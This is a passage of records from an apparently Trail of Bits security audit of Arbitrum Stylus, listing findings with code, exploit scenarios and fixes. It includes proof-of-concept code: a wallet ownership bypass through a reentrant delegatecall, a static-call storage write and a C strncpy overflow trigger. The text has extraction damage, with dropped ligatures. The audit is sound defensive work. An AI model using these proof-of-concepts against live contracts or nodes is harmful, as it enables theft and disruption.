be omitted. Storage caches take into account only their current call context. Every Stylus program call creates a new EVM API requestor (EvmApiRequestor). #[no_mangle] pub unsafe extern \"C\" fn stylus_call( module: GoSliceData, calldata: GoSliceData, config: StylusConfig, req_handler: NativeRequestHandler, evm_data: EvmData, debug_chain: u32, output: *mut RustBytes, gas: *mut u64, ) -> UserOutcomeKind { let module = module.slice(); let calldata = calldata.slice().to_vec(); let compile = CompileConfig::version(config.version, debug_chain != 0); let evm_api = EvmApiRequestor::new(req_handler); let pricing = config.pricing; let output = &mut *output; let ink = pricing.gas_to_ink(*gas); // ... } Figure 34.1: A call to a Stylus program creates a new EVM API requestor. (stylus/arbitrator/stylus/src/lib.rs#169205) When a new EVM API requestor is created, a new StorageCache struct is created as well. impl<D: DataReader, H: RequestHandler<D>> EvmApiRequestor<D, H> { pub fn new(handler: H) -> Self { Self { handler, last_code: None, last_return_data: None, storage_cache: StorageCache::default(), } } Figure 34.2: A new storage cache is created. (stylus/arbitrator/arbutil/src/evm/req.rs#2836) When there is no need to share storage state between two calls, storage caches can operate independently of each other without any issues. However, in the EVM contract, storage state is shared for delegated and reentrant calls. A call that would share storage state would also create a new storage cache struct, which can cause the rst storage cache to become out of sync when the second cache modies some of the rst caches known values. Known values are those that the storage cache thinks are located in the state trie. Such situations could cause storage reads to be incorrect or outdated and write operations to be omitted. Exploit Scenario A multisignature Stylus program SmartWallet allows arbitrary program execution with one important invariant: the ownership of the program is not allowed to change after the execution of the inner call (gure 34.3). Because the inner call is a reentrant call, the storage cache becomes out of sync; this causes the ownership invariant check to be faulty, allowing it to be bypassed (gures 34.434.5). #![no_main] use stylus_sdk::{ alloy_primitives::Address, call::RawCall, console, stylus_proc::{entrypoint, external, sol_storage}, }; extern crate alloc; #[global_allocator] static ALLOC: mini_alloc::MiniAlloc = mini_alloc::MiniAlloc::INIT; sol_storage! { #[entrypoint] pub struct SmartWallet { address owner; bool initialized; } } #[external] impl SmartWallet { pub fn owner(&self) -> Result<Address, String> { Ok(self.owner.get()) } pub fn initialize(&mut self, owner: Address) -> Result<(), String> { if self.initialized.get() { return Err(\"Already initialized\".into()); } self.owner.set(owner); self.initialized.set(true); Ok(()) } pub fn execute(&mut self, args: Vec<u8>) -> Result<Vec<u8>, Vec<u8>> { // ... some multisig access controls let previous_owner = self.owner.get(); let mut args = &args[..]; let mut take_args = |n_bytes: usize| -> &[u8] { let value = &args[..n_bytes]; args = &args[n_bytes..]; value }; let kind = take_args(1)[0]; let addr = Address::try_from(take_args(20)).unwrap(); let raw_call = match kind { 0 => RawCall::new(), 1 => RawCall::new_delegate(), 2 => RawCall::new_static(), x => panic!(\"unknown call kind {x}\"), }; let return_data = raw_call.call(addr, args)?; assert_eq!( previous_owner, self.owner.get(), \"Owner cannot change during `execute` call\" ); Ok(return_data) } } Figure 34.3: A multisignature wallet that includes an invariant that the program ownership must not change after the execution of the inner call func TestProgramSmartWalletPoc(t *testing.T) { t.Parallel() testSmartWalletPoc(t, true) } func testSmartWalletPoc(t *testing.T, jit bool) { builder, auth, cleanup := setupProgramTest(t, jit) ctx := builder.ctx l2info := builder.L2Info l2client := builder.L2.Client defer cleanup() ownerAddress := l2info.GetAddress(\"Owner\") programAddr := deployWasm(t, ctx, auth, l2client, \"../arbitrator/stylus/tests/storage-poc/target/wasm32-unknown-unknown/release/storag e-poc.wasm\") storageAddr := deployWasm(t, ctx, auth, l2client, rustFile(\"storage\")) colors.PrintGrey(\"storage.wasm colors.PrintGrey(\"storage-poc.wasm \", programAddr) \", storageAddr) programsAbi := `[{\"type\":\"function\",\"name\":\"execute\",\"inputs\":[{\"name\":\"args\",\"type\":\"uint8[]\"}],\"o utputs\":[],\"stateMutability\":\"nonpayable\"},{\"type\":\"function\",\"name\":\"initialize\",\"i nputs\":[{\"name\":\"owner\",\"type\":\"address\",\"internalType\":\"address\"}],\"outputs\":[],\"st ateMutability\":\"nonpayable\"},{\"type\":\"function\",\"name\":\"owner\",\"inputs\":[],\"outputs\" :[{\"name\":\"\",\"type\":\"uint256\",\"internalType\":\"uint256\"}],\"stateMutability\":\"view\"}]` callOwner, _ := util.NewCallParser(programsAbi, \"owner\") callInitialize, _ := util.NewCallParser(programsAbi, \"initialize\") callExecute, _ := util.NewCallParser(programsAbi, \"execute\") ensure := func(tx *types.Transaction, err error) *types.Receipt { t.Helper() Require(t, err) receipt, err := EnsureTxSucceeded(ctx, l2client, tx) Require(t, err) return receipt } pack := func(data []byte, err error) []byte { Require(t, err) return data } assertProgramOwnership := func() { args, _ := callOwner() returnData := sendContractCall(t, ctx, programAddr, l2client, args) newOwner := common.BytesToAddress(returnData) if ownerAddress == newOwner { colors.PrintRed(\"Ownership remains\") } else { Fatal(t, \"Owner changed\", ownerAddress, newOwner) } } tx := l2info.PrepareTxTo(\"Owner\", &programAddr, 1e9, nil, pack(callInitialize(ownerAddress))) ensure(tx, l2client.SendTransaction(ctx, tx)) // \"Owner\" remains the owner of the program. assertProgramOwnership() key := common.Hash{} value := common.HexToHash(\"0xdead\") args := []uint8{} args = append(args, 0x01) args = append(args, storageAddr.Bytes()...) // storage address args = append(args, 0x01) args = append(args, key.Bytes()...) args = append(args, value.Bytes()...) // storage write op // key // value // delegatecall tx = l2info.PrepareTxTo(\"Owner\", &programAddr, 1e9, nil, pack(callExecute(args))) ensure(tx, l2client.SendTransaction(ctx, tx)) // This passes // The `owner` address has been modified through the call to `execute`. assertStorageAt(t, ctx, l2client, programAddr, key, value) // This fails // \"Owner\" is not the owner of the program anymore. assertProgramOwnership() validateBlocks(t, 1, jit, builder) } Figure 34.4: The Go system test, which is able to bypass SmartWallets ownership invariant go test ./system_tests/... -run ^TestProgramSmartWalletPoc$ ... Ownership remains ... --- FAIL: TestProgramSmartWalletPoc (0.81s) program_test.go:1096: [Owner changed 0x26E554a8acF9003b83495c7f45F06edCB803d4e3 0x000000000000000000000000000000000000dEaD] FAIL FAIL FAIL github.com/offchainlabs/nitro/system_tests 1.735s Figure 34.5: The program ownership is changed. Recommendations Short term, modify the associated code so that the storage caches values are committed beforehand whenever delegated or reentrant calls are possible. Alternatively, consider sharing storage caches between call frames. However, the second option will likely come with signicant code ineciencies and overhead. Long term, thoroughly document the intended behavior of the cache, including whether it should persist across calls and any potentially unsafe uses for Stylus developers.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "35. Storage cache can be written to in a static call context ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The storage cache can be written to inside of a static call context, which can lead to confusing and unexpected behavior. The storage cache is intended to minimize storage read and write operations. When the storage cache is ushed, only the values that have changed from the known values (i.e., values that are dirty) are committed to the persistent storage state, via the EvmApiMethod::SetTrieSlots method. fn flush_storage_cache(&mut self, clear: bool, gas_left: u64) -> Result<u64> { let mut data = Vec::with_capacity(64 * self.storage_cache.len() + 8); data.extend(gas_left.to_be_bytes()); for (key, value) in &mut self.storage_cache.slots { if value.dirty() { data.extend(*key); data.extend(*value.value); value.known = Some(value.value); } } if clear { self.storage_cache.clear(); } if data.len() == 8 { return Ok(0); // no need to make request } let (res, _, cost) = self.request(EvmApiMethod::SetTrieSlots, data); if res[0] != EvmApiStatus::Success.into() { bail!(\"{}\", String::from_utf8_or_hex(res)); } Ok(cost) } Figure 35.1: Only dirty values are committed to persistent state when the storage cache is ushed. (stylus/arbitrator/arbutil/src/evm/req.rs#122145) Values that are not dirty do not result in EvmApiMethod::SetTrieSlots requests. In order for a value to be known, it must be either retrieved from Geth via the GetBytes32 EVM API method or committed by the storage cache itself via the SetTrieSlots EVM API method. This means that a get request can change the behavior of a subsequent storage cache ush host I/O operation, leading to strange and unexpected behavior inside a static call context where persistent state changes are not permitted. Exploit Scenario Inside of a static call context, storage writes are not allowed. However, writing multiple values to the storage cache is allowed if they end up equaling the known values. #![no_main] use stylus_sdk::{ alloy_primitives::{B256, U256}, call::RawCall, console, contract, msg, storage::{GlobalStorage, StorageCache}, stylus_proc::entrypoint, }; extern crate alloc; #[global_allocator] static ALLOC: mini_alloc::MiniAlloc = mini_alloc::MiniAlloc::INIT; #[entrypoint] fn user_main(_input: Vec<u8>) -> Result<Vec<u8>, Vec<u8>> { let slot = U256::from(0); let get = |slot| { let value = StorageCache::get_word(slot); console!(\"StorageCache::get_word({slot}) -> {value}\"); }; let set = |slot, value| { console!(\"StorageCache::set_word({slot}, {value})\"); unsafe { StorageCache::set_word(slot, value) }; }; let flush = || { console!(\"StorageCache::flush()\"); StorageCache::flush(); }; if msg::reentrant() { get(slot); // If this line is removed, the staticcall fails. // Inside staticcall context. set(slot, B256::new([0xaa; 32])); set(slot, B256::new([0xbb; 32])); set(slot, B256::new([0x00; 32])); flush(); } else { // Make reentrant static call. let address = contract::address(); unsafe { RawCall::new_static().call(address, &[])? }; } Ok(vec![]) } Figure 35.2: The static call fails if a previous GetBytes32 EVM API request is removed. Recommendations Short term, consider forbidding writes to the storage cache inside of a static call context. This is especially important if the storage cache is to be shared among reentrant calls, as explained in the issue TOB-STYLUS-34, as a static call should not be able to inuence another calls behavior through shared state (aside from gas costs). Long term, be aware of optimizations that could lead to strange and confusing patterns when interacting with the system on a higher level.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "36. Revert conditions always override user returned status ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Certain corner conditions in Stylus program execution can cause valid executions to be agged as reverts. Once a Stylus program exits early, the early_exit ag is used to indicate that early should be set as the exit code in the program_internal__set_done function (gure 36.1). #[no_mangle] pub unsafe extern \"C\" fn program_internal__set_done(mut status: UserOutcomeKind) -> u32 { use UserOutcomeKind::*; let program = Program::current(); let module = program.module; let mut outs = program.outs.as_slice(); let mut ink_left = program_ink_left(module); // apply any early exit codes if let Some(early) = program.early_exit { status = early; } // check if instrumentation stopped the program if program_ink_status(module) != 0 { status = OutOfInk; outs = &[]; ink_left = 0; } if program_stack_left(module) == 0 { status = OutOfStack; outs = &[]; ink_left = 0; } let gas_left = program.config.pricing.ink_to_gas(ink_left); let mut output = Vec::with_capacity(8 + outs.len()); output.extend(gas_left.to_be_bytes()); output.extend(outs); program .request_handler() .set_request(status as u32, &output) } Figure 36.1: The program_internal__set_done function in arbitrator/wasm-libraries/user-host/src/link.rs#L194L228 However, this function can override the status returned for program executions if either the ink amount or the stack size is zero, agging them as reverts. Both of these conditions can be reached if a program exits early. Exploit Scenario Alice optimizes a Stylus program execution to use exactly a certain amount of ink in the context of a larger DeFi system executing untrusted calls. Her program is called with the exact amount of ink required to run, so it exits with zero ink left. However, the execution is agged as a revert. Recommendations Short term, consider changing the program_internal__set_done function so that valid executions resulting in zero gas are not automatically agged as reverts, making sure the common out-of-gas and out-of-stack executions are handled correctly. Long term, review the local and global invariants behind each component to make sure corner cases are correctly dened and handled.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "37. CacheManager bids cannot be increased ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Bids in the cache manager placed on a particular code hash cannot be modied and do not accumulate. When a bid is placed, the CacheManager Solidity contract checks whether the code hash is currently cached and reverts the bid if so. /// Places a bid, reverting if payment is insufficient. function placeBid(bytes32 codehash) external payable { if (isPaused) { revert BidsArePaused(); } if (_isCached(codehash)) { revert AlreadyCached(codehash); } uint64 asm = _asmSize(codehash); (uint256 bid, uint64 index) = _makeSpace(asm); return _addBid(bid, codehash, asm, index); } Figure 37.1: This check prevents bids from being placed on already cached programs. (stylus-contracts/src/chain/CacheManager.sol#104144) This makes it impossible to increase a bid before the program is evicted either due to other bids being placed or through sucient calls to makeSpace. This limitation creates a bad user experience. A user who wants to increase a bid would have to create a new bid, but would rst have to pay to evict the program. It might also make it dicult for a popular dapp with many low-capital users to coordinate and combine their funds for a shared bid. Exploit Scenario Bob wants to increase a previous bid to his token program. He cannot simply place a new bid; he is required to make sucient space. He calls makeSpace to evict his own program, requiring a 1 ETH payment. In order to add his new 2 ETH bid, he must now pay 3 ETH in total. Recommendations Short term, document this limitation of the auction system. Consider adding an alternative unsafe function that does not check whether the code is already cached (however, this would allow multiple entries per code hash). Alternatively, consider adjusting the implementation to allow bids for programs to be increased. Long term, review the bid mechanisms with user experience in mind; document any sources of friction and ways in which they could be mitigated.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "38. The makeSpace function does not refund excess bid value and can be front-run ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The makeSpace function, used to make space for programs in the cache manager, does not refund funds sent above the minimum bid value, even if no state changes are performed. The makeSpace function accepts ETH and requires a minimum bid to be made until enough space is available. /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the new amount of space available on success. /// Note: will only make up to 5Mb of space. Call repeatedly for more. function makeSpace(uint64 size) external payable returns (uint64 space) { if (size > MAX_MAKE_SPACE) { size = MAX_MAKE_SPACE; } _makeSpace(size); return cacheSize - queueSize; } /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the bid and the index to use for insertion. function _makeSpace(uint64 size) internal returns (uint256 bid, uint64 index) { // discount historical bids by the number of seconds bid = msg.value + block.timestamp * uint256(decay); index = uint64(entries.length); uint256 min; while (queueSize + size > cacheSize) { (min, index) = _getBid(bids.pop()); _deleteEntry(min, index); } if (bid < min) { revert BidTooSmall(bid, min); } } Figure 38.1: The makeSpace function requires the minimum bid to be matched until enough space is made. (stylus-contracts/src/chain/CacheManager.sol#118144) The contract keeps any funds sent above the minimum bid value. This includes the case in which enough space is already available and no funds are required. This can happen, for example, when two calls to makeSpace are initiated by dierent parties. There is also the possibility that a user calls makeSpace to create space, only for that space to be occupied by other bids right after it is freed. Exploit Scenario Bob calls makeSpace in order to free up space in the cache manager. In the meantime, Alice calls makeSpace herself for the same reason. Bobs transaction ends up doing nothing and does not return his funds. Alice is able to insert her program, whereas Bob is where he was at the start. Recommendations Short term, have the cache manager refund any excess funds sent above the minimum bid required for making enough space. Long term, document this behavior so that users are aware of it.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "39. Bids do not account for program size ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "It is possible for a single bid to evict many programs, regardless of their cumulative price per program byte size, resulting in an unfair auction system. A program that is to be inserted into the cache manager with a slightly higher bid than many others will be prioritized over those other programs, regardless of the total amount paid per occupied code size. This is because the code for adding a bid for a program does not take into account the program size itself. /// Adds a bid function _addBid( uint256 bid, bytes32 code, uint64 size, uint64 index ) internal { if (queueSize + size > cacheSize) { revert AsmTooLarge(size, queueSize, cacheSize); } Entry memory entry = Entry({size: size, code: code}); ARB_WASM_CACHE.cacheCodehash(code); bids.push(_packBid(bid, index)); queueSize += size; if (index == entries.length) { entries.push(entry); } else { entries[index] = entry; } emit InsertBid(bid, code, size); } Figure 39.1: The _addBid function does not take program size into account (stylus-contracts/src/chain/CacheManager.sol#145167) Exploit Scenario There are 50 programs in the cache manager, each of size 0.1 MB and a 1 ETH bid. Bob inserts a new program with a 1.01 ETH bid. If Bobs program size is 0.1 MB, one program will be evicted (1 ETH worth of bids). If the program size is 5 MB, 50 programs will be evicted (50 ETH worth of bids). Bobs program should not be able to evict any number of programs without paying extra fees. Recommendations Short term, consider dividing the bid in _addBid by the program size in order to charge a price per byte instead of a xed price per program. Long term, thoroughly document the intended behavior of the cache manager in terms of program sizes.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "40. Incorrect bid check ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The _makeSpace function allows new bids to go through if they are equal to the current bid (gure 40.1). This is unexpected for an auction system, in which new bids should be considered only if they are superior to previous ones. /// Evicts entries until enough space exists in the cache, reverting if payment is insufficient. /// Returns the bid and the index to use for insertion. function _makeSpace(uint64 size) internal returns (uint192 bid, uint64 index) { // discount historical bids by the number of seconds bid = uint192(msg.value + block.timestamp * uint256(decay)); index = uint64(entries.length); uint192 min; uint64 limit = cacheSize; while (queueSize + size > limit) { (min, index) = _getBid(bids.pop()); _deleteEntry(min, index); } if (bid < min) { revert BidTooSmall(bid, min); } } Figure 40.1: The check is a less-than comparison, allowing bids equal to the current bid to be accepted. (stylus-contracts/src/chain/CacheManager.sol#137153) Recommendations Short term, replace the check with bid <= min. Long term, thoroughly document the intended behavior of the auction system and use it as a baseline to review its actual behavior.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "41. MemoryGrow opcode is underpriced for programs with xed memory ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The ink charged by the MemoryGrow opcode is less than expected for programs that have a xed memory size. Stylus denes an ink price for every WASM opcode to be used during program activation. The costs for certain opcodes, such as MemoryGrow, are handled by a dierent part of the code (gure 41.4). pub fn pricing_v1(op: &Operator, tys: &HashMap<SignatureIndex, FunctionType>) -> u64 {  let ink = match op { {...omitted for brevity...} dot!(MemoryGrow) => 1, // cost handled by memory pricer Figure 41.1: Part of the pricing_v1 function that defers the ink price for MemoryGrow to the memory pricer However, if a WASM program has xed memory (and therefore does not import the pay function), the cost of the opcode will be unmodied (gure 41.2). impl<'a> FuncMiddleware<'a> for FuncHeapBound { fn feed<O>(&mut self, op: Operator<'a>, out: &mut O) -> Result<()> where O: Extend<Operator<'a>>, { use Operator::*; let Some(pay_func) = self.pay_func else { out.extend([op]); return Ok(()); }; Figure 41.2: The header of the feed function of the FuncHeapBound middleware A call to MemoryGrow for a program with a xed memory returns -1, which is correct according to the WASM standard. Unfortunately, the price of that opcode will be 1 ink, which is too small to cover the actual cost of the operation in a WASM execution. Exploit Scenario Eve crafts a malicious WASM program that repeatedly triggers the MemoryGrow opcode in a WASM program that has a xed memory in order to exhaust the resources of the validators. Due to the low cost of the MemoryGrow opcode on programs with a xed memory, she pays a minimal amount of ink to carry out the attack. Recommendations Short term, increase the cost of the MemoryGrow opcode to make sure it is sucient for all programs, including those with xed memory. Long term, perform fuzz testing of the processes for validating, activating, and executing WASM contracts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "14. Undened behavior when passing padded struct via FFI ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Union types used in Wasmer that cross FFI boundaries and unconditionally transmute between instances of vmctx and host_env are not derived from repr(C), which could lead to undened behavior due to inconsistent padding. An example is shown in gures 14.1 and 14.2. Types that cross FFI boundaries should be derived from repr(C) so that the order, size, and alignment of elds is exactly what you would expect from C or C++, as documented in the Rustonomicon. #[derive(Copy, Clone, Eq)] pub union VMFunctionContext { /// Wasm functions take a pointer to [`VMContext`]. pub vmctx: *mut VMContext, /// Host functions can have custom environments. pub host_env: *mut std::ffi::c_void, } impl VMFunctionContext { /// Check whether the pointer stored is null or not. pub fn is_null(&self) -> bool { unsafe { self.host_env.is_null() } } } Figure 14.1: A union that is used across FFI boundaries (wasmer/lib/vm/src/vmcontext.rs#2538) /// Call the wasm function pointed to by `callee`. /// /// * `vmctx` - the callee vmctx argument /// * `caller_vmctx` - the caller vmctx argument /// * `trampoline` - the jit-generated trampoline whose ABI takes 4 values, the callee vmctx, the caller vmctx, the `callee` argument below, and then the /// /// `values_vec` argument. /// * `callee` - the third argument to the `trampoline` function /// * `values_vec` - points to a buffer which holds the incoming arguments, and to /// which the outgoing return values will be written. /// /// # Safety /// /// Wildly unsafe because it calls raw function pointers and reads/writes raw /// function pointers. pub unsafe fn wasmer_call_trampoline( trap_handler: Option<*const TrapHandlerFn<'static>>, config: &VMConfig, vmctx: VMFunctionContext, trampoline: VMTrampoline, callee: *const VMFunctionBody, values_vec: *mut u8, ) -> Result<(), Trap> { catch_traps(trap_handler, config, || { mem::transmute::<_, extern \"C\" fn(VMFunctionContext, *const VMFunctionBody, *mut u8)>( trampoline, )(vmctx, callee, values_vec); }) } Figure 14.2: A call to a foreign interface with the union shown in gure 14.1 (wasmer/lib/vm/src/trap/traphandlers.rs#642670) Recommendations Short term, derive types that cross FFI boundaries from repr(C). Long term, enable Clippys default_union_representation lint and integrate cargo miri into the testing of Wasmer.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "15. Styluss 63/64th gas forwarding di\u0000ers from go-ethereum ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The Stylus VM deviates from the Ethereum specication and the behavior of the reference implementation in its application of the 63/64th gas forwarding rule, dened in EIP-150. EIP-150 states that if a call asks for more gas than all but one 64th of the maximum allowed amount, call with all but one 64th of the maximum allowed amount of gas. The Go implementation of the Ethereum protocol calculates the all but one 64th amount in the callGas function. The new rule is applied only when the requested amount of gas exceeds the allowed gas computed using the rule. evm.callGasTemp, err = callGas(evm.chainRules.IsEIP150, contract.Gas, gas, stack.Back(0)) Figure 15.1: go-ethereums calculation for gas available in CALL (go-ethereum/core/vm/gas_table.go#391) func callGas(isEip150 bool, availableGas, base uint64, callCost *uint256.Int) (uint64, error) { if isEip150 { availableGas = availableGas - base gas := availableGas - availableGas/64 // If the bit length exceeds 64 bit we know that the newly calculated \"gas\" for EIP150 // is smaller than the requested amount. Therefore we return the new gas instead // of returning an error. if !callCost.IsUint64() || gas < callCost.Uint64() { return gas, nil } } if !callCost.IsUint64() { return 0, ErrGasUintOverflow } return callCost.Uint64(), nil } Figure 15.2: An application of 63/64th rule (go-ethereum/core/vm/gas.go#3753) On the other hand, Stylus applies the 63/64th rule indiscriminately using the minimum value of the requested gas amount and the gas available to the parent call. The 63/64th rule should be applied only if the call requests more than all but one 64th of the gas. gas = gas.min(env.gas_left()?); // provide no more than what the user has let contract = env.read_bytes20(contract)?; let input = env.read_slice(calldata, calldata_len)?; let value = value.map(|x| env.read_bytes32(x)).transpose()?; let api = &mut env.evm_api; let (outs_len, gas_cost, status) = call(api, contract, &input, gas, value); Figure 15.3: Styluss calculation for gas available in CALL (arbitrator/stylus/src/host.rs#153160) startGas := gas // computes makeCallVariantGasCallEIP2929 and gasCall/gasDelegateCall/gasStaticCall baseCost, err := vm.WasmCallCost(db, contract, value, startGas) if err != nil { return 0, gas, err } gas -= baseCost // apply the 63/64ths rule one64th := gas / 64 gas -= one64th Figure 15.4: Styluss incorrect application of the 63/64th rule (arbos/programs/api.go#114125) Recommendations Short term, have the code pass all but one 64th of the available gas only if a call requests more than the maximum allowed gas. Long term, develop machine-readable tests for the Stylus VM that include the expected gas consumption, similar to Ethereums reference tests.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "19. Tests missing assertions for some errors and values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "Many of the tests in the codebase perform incomplete assertions, which may prevent the tests from detecting bugs in the event of future code changes. In particular, some tests check only the following:  Whether an error was returned, but not the type or the message of the error  Whether the resulting structures eld values are as expected Additionally, the tests do not test all edge cases. For example, there are no unit tests that ensure that the enforced WASM limits (mentioned in TOB-STYLUS-16) actually work. Those issues can be seen, for example, in the provers tests, as shown in gure 19.1. #[test] pub fn reject_reexports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } #[test] pub fn reject_ambiguous_imports() { let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap(); let wasm = as_wasm(...); let _ = binary::parse(&wasm, Path::new(\"\")).unwrap_err(); } Figure 19.1: stylus/arbitrator/prover/src/test.rs#L14-L54 Recommendations Short term, apply the patch provided in appendix E to improve the quality of the tests. Long term, further refactor the tests to ensure they include assertions for all expected states of values or errors that are returned from the tested functions.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Machine state serialization/deserialization does not account for error guards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The code for serialization and deserialization of the machine state does not account for any error guards (gure 20.1). If any error guards are present, they could produce an invalid machine state when the prover is run from a deserialized state. pub fn serialize_state<P: AsRef<Path>>(&self, path: P) -> Result<()> { let mut f = File::create(path)?; let mut writer = BufWriter::new(&mut f); let modules = self .modules .iter() .map(|m| ModuleState { globals: Cow::Borrowed(&m.globals), memory: Cow::Borrowed(&m.memory), }) .collect(); let state = MachineState { steps: self.steps, status: self.status, value_stack: Cow::Borrowed(&self.value_stack), internal_stack: Cow::Borrowed(&self.internal_stack), frame_stack: Cow::Borrowed(&self.frame_stack), modules, global_state: self.global_state.clone(), pc: self.pc, stdio_output: Cow::Borrowed(&self.stdio_output), initial_hash: self.initial_hash, }; bincode::serialize_into(&mut writer, &state)?; writer.flush()?; drop(writer); f.sync_data()?; Ok(()) } // Requires that this is the same base machine. If this returns an error, it has not mutated `self`. pub fn deserialize_and_replace_state<P: AsRef<Path>>(&mut self, path: P) -> Result<()> { let reader = BufReader::new(File::open(path)?); let new_state: MachineState = bincode::deserialize_from(reader)?; if self.initial_hash != new_state.initial_hash { bail!( \"attempted to load deserialize machine with initial hash {} into machine with initial hash {}\", new_state.initial_hash, self.initial_hash, ); } assert_eq!(self.modules.len(), new_state.modules.len()); // Start mutating the machine. We must not return an error past this point. for (module, new_module_state) in self.modules.iter_mut().zip(new_state.modules.into_iter()) { module.globals = new_module_state.globals.into_owned(); module.memory = new_module_state.memory.into_owned(); } self.steps = new_state.steps; self.status = new_state.status; self.value_stack = new_state.value_stack.into_owned(); self.internal_stack = new_state.internal_stack.into_owned(); self.frame_stack = new_state.frame_stack.into_owned(); self.global_state = new_state.global_state; self.pc = new_state.pc; self.stdio_output = new_state.stdio_output.into_owned(); Ok(()) } Figure 20.1: Machine state serialization and deserialization code (stylus/arbitrator/prover/src/machine.rs#L1430-L1488) When a machine state is serialized and later deserializedas is the case when CreateValidationNode is run (gure 20.2)the information about any error guards is lost. func CreateValidationNode(configFetcher ValidationConfigFetcher, stack *node.Node, fatalErrChan chan error) (*ValidationNode, error) { Figure 20.2: The CreateValidationNode function (stylus/validator/valnode/valnode.go#L87) This would result in a mismatch between the actual machine state and that which starts from a serialized state. Exploit Scenario Alice creates a validation node from a serialized machine state. Because the error guards were not included during serialization, the correct execution of the machine is now undetermined. Recommendation Short term, include ErrorGuardStack (machine.guards) as part of the machine state serialization and deserialization process. Long term, when introducing new features, keep in mind all of the areas that might be aected by them and ensure there is sucient test coverage.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "28. Possible out-of-bounds write in strncpy function in Stylus C SDK ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The strncpy function dened in the Stylus C SDK writes past the destination string when the source string (src) is shorter than the number of bytes (num) to write to the destination string (gure 28.1). This causes another area of the memory of the program to be overwritten, which may have various consequences depending on the program code and its memory layout. char *strncpy(char *dst, const char *src, size_t num) { size_t idx=0; while (idx<num && src[idx]!=0) { idx++; } memcpy(dst, src, idx); if (idx < num) { memset(dst+num, 0, num-idx); } return dst; } Figure 28.1: stylus/arbitrator/langs/c/src/simplelib.c#L6L16 This bug can be detected by compiling an example program using this function (gure 28.2) with ASan (by using the -fsanitize=address ag) with the GCC or Clang compiler. #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> char *mystrncpy(char *dst, const char *src, size_t num) { // code from Figure 28.1 } int main() { char buf[4] = {0}; mystrncpy(buf, \"ab\", 4); printf(\"buf='%s'\\n\", buf); } Figure 28.2: An example program that triggers the bug described in the nding Figure 28.3: Output from the example program, showing that it detects this issue Recommendations Short term, change the problematic line to memset(dst+idx, 0, num-idx); to prevent the issue described in this nding. Long term, implement tests for edge-case inputs for the Stylus SDK functions. References  strncpy manual page", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "29. Insu\u0000cient out-of-bounds check in memcpy utility function for ConstString ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "The memcpy utility function, used to implement ConstString functions in the Stylus Rust SDK, contains an insucient check against out-of-bounds conditions: it misses the following conditions that would cause a program to write past the destination buer:  The oset is equal to the destination length.  The source length is larger than the destination length. /// Copies data from `source` to `dest` in a `const` context. /// This function is very inefficient for other purposes. const fn memcpy<const N: usize>( mut source: &[u8], mut dest: [u8; N], mut offset: usize, ) -> [u8; N] { if offset > dest.len() { panic!(\"out-of-bounds memcpy\"); } while !source.is_empty() { dest[offset] = source[0]; offset += 1; (_, source) = source.split_at(1); } dest } Figure 29.1: stylus/arbitrator/langs/rust/stylus-sdk/src/abi/const_string.rs#L26L40 Recommendations Short term, change the insucient out-of-bounds check in the memcpy function to if offset + source.len() >= dest.len() to prevent potential bugs that could occur if the function were used incorrectly. Long term, implement tests for edge case inputs for the Stylus SDK functions.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "30. Unused and unset timeouts in Arbitrator's JIT code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf", "body": "There are potential issues with timeouts in the Arbitrators JIT code:", "labels": ["Trail of Bits", "Severity: Informational", 